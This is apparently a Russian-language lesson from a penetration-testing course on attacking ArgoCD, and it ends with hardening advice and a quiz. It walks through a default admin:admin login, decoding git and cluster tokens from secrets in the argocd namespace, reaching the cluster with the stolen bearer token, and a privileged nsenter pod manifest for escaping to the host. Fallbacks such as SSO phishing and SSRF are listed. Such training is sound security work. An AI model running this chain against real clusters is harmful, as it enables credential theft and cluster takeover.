---
id: cloud-argocd
title: "ArgoCD: GitOps, repo-креды и доступ к кластеру"
category: cloud
parent: cloud-cicd-deep
difficulty: hard
order: 2
tags: [cloud, argocd, gitops, kubernetes, repo, cluster, rbac]
prerequisites: [cloud-cicd-deep, cloud-kubernetes-rbac]
useful_for:
  - "Атаки на ArgoCD"
  - "Захват доступа к кластеру через GitOps"
  - "Пентест GitOps-развёртываний"
estimated_minutes: 50
summary: "ArgoCD: applications, repo credentials, cluster credentials и RBAC. Как GitOps-контроллер держит доступ к репозиториям и кластерам и как этим злоупотребить."
---
## Задача

**ArgoCD** — это GitOps-инструмент: он следит за git-репозиторием с манифестами и постоянно приводит Kubernetes-кластер к описанному состоянию. Чтобы это делать, ArgoCD хранит **креды к репозиториям** и **доступ к кластерам**. Задача: показать, как открытый ArgoCD отдаёт эти креды и доступ. Разберём на конкретном инстансе.

## Данные: открытый ArgoCD API

Находим ArgoCD на `https://argocd.acme.io`. Смотрим, что доступно:

```
$ curl -sk https://argocd.acme.io/api/version
{"Version":"v2.9.3"}
$ curl -sk https://argocd.acme.io/api/v1/applications
{"error":"Unauthorized"}
```

Версия отдаётся, список приложений требует авторизации. Пробуем **дефолтный пароль** — ArgoCD по умолчанию создаёт пользователя `admin`, а его пароль — имя сервера в base64 (или `admin` в старых версиях):

```
$ argocd login argocd.acme.io --username admin --password admin --insecure
'admin:login' logged in successfully
```

Логин прошёл. Дефолтный пароль не сменили.

## Пробуем в лоб: что видно после входа

```
$ argocd app list
NAME        CLUSTER        NAMESPACE  PROJECT  STATUS
web-prod    https://kubernetes.default.svc  web  prod  Synced
payments    https://10.0.5.20:6443          pay  prod  Synced
```

Два приложения. ArgoCD знает, куда деплоить. Смотрим подробности — откуда тянется манифест:

```
$ argocd app get payments -o json | jq '{repo: .spec.source.repoURL, path: .spec.source.path}'
{ "repo": "https://git.acme.io/ops/payments-manifests.git", "path": "overlays/prod" }
```

## Приём: читаем repo- и cluster-креды

Ключевой момент: чтобы тянуть из **приватного** репозитория и пушить в кластер, ArgoCD хранит креды. Они лежат в Kubernetes-секретах в namespace `argocd`:

```
$ kubectl -n argocd get secrets
NAME                          TYPE
argocd-secret                 Opaque
repo-https-git.acme.io-12345  Opaque
cluster-10.0.5.20-6443        Opaque
```

Читаем repo-секрет — там git-логин/токен:

```
$ kubectl -n argocd get secret repo-https-git.acme.io-12345 -o jsonpath='{.data.password}' | base64 -d
glpat-XXXXXXXXXXXXXXXXXXXX
```

Читаем cluster-секрет — там **service-account токен кластера**:

```
$ kubectl -n argocd get secret cluster-10.0.5.20-6443 -o jsonpath='{.data.config}' | base64 -d | jq -r .bearerToken
eyJhbGciOiJSUzI1NiIs...
```

С этим токеном мы — внутри чужого кластера.

## Полный прогон: от дефолтного пароля до кластера

1. **Разведка.** `/api/version` → версия; пробуем `admin:admin`.
2. **Вход.** `argocd login` с дефолтным паролем.
3. **Список приложений.** `argocd app list` → куда деплоится.
4. **Креды.** Читаем секреты `argocd`-namespace: git-токен и cluster-токен.
5. **Выход в кластер.** Используем bearer-токен напрямую:

```
$ kubectl --server=https://10.0.5.20:6443 --token=$TOKEN --insecure-skip-tls-verify get pods -A
NAMESPACE   NAME
prod        payments-7d9f...
```

6. **Эскалация.** Если токен от `cluster-admin` — создаём под с привилегиями (см. `cloud-kubernetes-escape`).

## RBAC и SSO

ArgoCD имеет свою RBAC (роли и политики), часто связанную с SSO. Слабые места:

- **Дефолтный `admin`** без смены пароля.
- **RBAC `role:admin`** на широкую группу из SSO.
- **`anonymous` доступ** к приложениям (`argocd-cm`: `users.anonymous.enabled: "true"`).
- **Токены проектов** (`argocd proj role`) с правами на sync.

Проверка конфига:

```
$ kubectl -n argocd get cm argocd-rbac-cm -o jsonpath='{.data.policy\.csv}'
p, role:dev, applications, get, */*, allow
g, acme-devs, role:dev
```

Если группа из внешнего IdP получает `applications, sync` — участники группы могут деплоить что угодно.

## Как работает sync и почему это важно

ArgoCD периодически сверяет желаемое состояние (манифесты в git) с фактическим (ресурсы в кластере) и «подтягивает» кластер к git. Этот цикл называется **reconciliation** (согласование). Ключевой вывод для атакующего: **кто контролирует git-репозиторий приложения, тот контролирует кластер**.

Если у нас есть push в `acme/payments-manifests`, мы можем добавить в манифест привилегированный под — и ArgoCD сам его развернёт:

```yaml
apiVersion: v1
kind: Pod
metadata: { name: pwn }
spec:
  hostPID: true
  containers:
    - name: c
      image: alpine
      command: ["nsenter", "-t", "1", "-m", "-p", "sh"]
      securityContext: { privileged: true }
```

ArgoCD применит его при следующем sync — без нашего прямого доступа к кластеру.

## Частые ошибки

- **Не сменили дефолтный `admin`.** Пароль `admin` или base64 от имени сервера.
- **`anonymous` доступ включён.** Интерфейс и API открыты без логина.
- **RBAC привязан к широкой SSO-группе.** Любой сотрудник деплоит что угодно.
- **Долгоживущие cluster-токены.** Один украденный секрет = вечный доступ.
- **ArgoCD в интернете.** Без VPN/SSO любой может брутить пароль.

## Защита и что ломает атаку

- **Сменить дефолтный admin-пароль**, включить SSO и MFA.
- **Отключить anonymous-доступ.**
- **RBAC по принципу минимума**, привязка к узким группам.
- **Не хранить долгоживущие cluster-токены** — использовать короткоживущие или OIDC.
- **Закрыть ArgoCD API** от интернета (VPN/SSO-прокси).

## Если не сработало

- **Пароль admin сменён** — идём через SSO-фишинг/токен или известные CVE ArgoCD.
- **Anonymous выключен, RBAC узкий** — ищем project-токены и доступ к git-репе.
- **Cluster-токены короткоживущие** — успеваем до истечения.
- **ArgoCD недоступен извне** — через SSRF/внутренний доступ.

## Мини-сценарий: от admin:admin до кластера

1. **Разведка.** `curl -sk https://argocd.acme.io/api/version` → `v2.9.3`; `/api/v1/applications` → `Unauthorized`.
2. **Вход.** `argocd login ... --username admin --password admin` → `logged in successfully`. Пароль не сменили.
3. **Список.** `argocd app list` → `payments` деплоится в кластер `10.0.5.20:6443`.
4. **Креды.** `kubectl -n argocd get secrets` → `repo-https-git.acme.io-...` и `cluster-10.0.5.20-6443`.
5. **Извлечение.** `get secret repo-... -o jsonpath='{.data.password}' | base64 -d` → git-токен; `get secret cluster-... | jq -r .bearerToken` → токен кластера.
6. **Выход в кластер.** `kubectl --server=https://10.0.5.20:6443 --token=$TOKEN get pods -A` → мы внутри.
7. **Закрепление.** Если токен от `cluster-admin` — создаём привилегированный под.

Дефолтный пароль плюс один секрет — и мы внутри чужого Kubernetes.

## Разбор: GitOps — это концентрация доверия

ArgoCD по своей природе держит **много** доверия в одном месте: креды ко всем репозиториям приложений и токены ко всем кластерам. Это делает его идеальной целью: скомпрометировав ArgoCD, атакующий получает не один кластер, а весь парк. Отсюда и требования к защите выше, чем к обычному сервису. Дефолтный пароль — катастрофа именно из-за этой концентрации. То же касается RBAC: если группа `developers` может делать `sync`, её участники могут развернуть привилегированный под в любой кластер. Правильная модель — SSO с MFA, узкий RBAC и короткоживущие cluster-креды вместо долгоживущих токенов.

## Что мы теперь знаем

1. ArgoCD — GitOps-контроллер, держащий креды репозиториев и кластеров.
2. Дефолтный `admin:admin` — частая дыра.
3. Repo- и cluster-секреты лежат в namespace `argocd`.
4. Cluster-токен = доступ внутрь Kubernetes.
5. Защита — смена пароля, SSO, узкий RBAC, отключение anonymous.

## На что смотреть дальше

- `/api/version` и доступность `/api/v1/applications`.
- Дефолтные креды `admin`.
- Секреты `repo-*` и `cluster-*` в namespace `argocd`.
- `argocd-rbac-cm`: политики и группы.
- Флаг anonymous-доступа.

## Быстрая проверка

```bash
curl -sk https://argocd.acme.io/api/version
argocd login argocd.acme.io --username admin --password admin --insecure
argocd app list
kubectl -n argocd get secrets | grep -E 'repo-|cluster-'
```

## Квиз

Проверь себя.

```quiz
- question: "Что такое ArgoCD?"
  options:
    - "GitOps-контроллер, приводящий кластер к состоянию из git"
    - "Сканер уязвимостей"
    - "Реестр образов"
    - "Балансировщик"
  answer: 0
  explanation: "ArgoCD следит за git и синхронизирует кластер."
- question: "Почему ArgoCD хранит чувствительные креды?"
  options:
    - "Ему нужен доступ к приватным репозиториям и кластерам"
    - "Он сканирует образы"
    - "Он хранит пароли пользователей"
    - "Он ведёт DNS"
  answer: 0
  explanation: "Без repo- и cluster-кредов он не сможет деплоить."
- question: "Какие секреты в namespace argocd дают доступ к кластеру?"
  options:
    - "cluster-<host>-<port> с bearer-токеном"
    - "argocd-secret"
    - "repo-https-*"
    - "default-token"
  answer: 0
  explanation: "Cluster-секрет содержит токен service-account кластера."
- question: "Что означает users.anonymous.enabled: 'true'?"
  options:
    - "Доступ к ArgoCD возможен без аутентификации"
    - "Включается MFA"
    - "Отключается RBAC"
    - "Шифруются секреты"
  answer: 0
  explanation: "Anonymous-доступ открывает интерфейс без логина."
- question: "Что прежде всего надо сделать с ArgoCD для защиты?"
  options:
    - "Сменить дефолтный admin-пароль и включить SSO"
    - "Отключить логи"
    - "Дать всем admin"
    - "Хранить токены в git"
  answer: 0
  explanation: "Дефолтный пароль и отсутствие SSO — главные риски."
```

## Куда дальше

В следующем уроке (`cloud-github-actions-pwn`) мы вернёмся к GitHub Actions и разберём pwn-requests — атаку, где обычный pull request из форка даёт секреты base-репозитория. А пока главное: GitOps-контроллер — это хранилище кредов к git и кластерам, и дефолтный пароль открывает его целиком.

## Где пригодится

- **Bug bounty:** открытые ArgoCD-инстансы.
- **Red team:** от GitOps к кластеру.
- **Пентест:** аудит ArgoCD и GitOps.
- **Работа/DevSecOps:** SSO, RBAC, отключение anonymous.
- **Дальше по дереву:** `cloud-gitlab-ci`, `cloud-kubernetes-rbac`.
